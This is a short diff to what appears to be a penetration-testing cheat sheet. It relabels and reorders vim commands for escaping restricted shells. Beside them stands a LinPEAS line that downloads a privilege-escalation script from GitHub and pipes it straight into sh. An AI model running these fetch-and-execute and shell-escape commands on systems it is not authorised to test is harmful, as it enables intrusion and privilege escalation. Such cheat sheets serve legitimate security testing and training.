@@ -71,11 +71,11 @@ LinPEAS
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
-Escape  restricted environments
+Escape  restricted environments (vim)
 ```
 :!/bin/sh
+:set shell=/bin/sh // :set shell=/bin/bash:shell
 :shell
-:set shell=/bin/sh
 ```
 ## Port Scanning
 
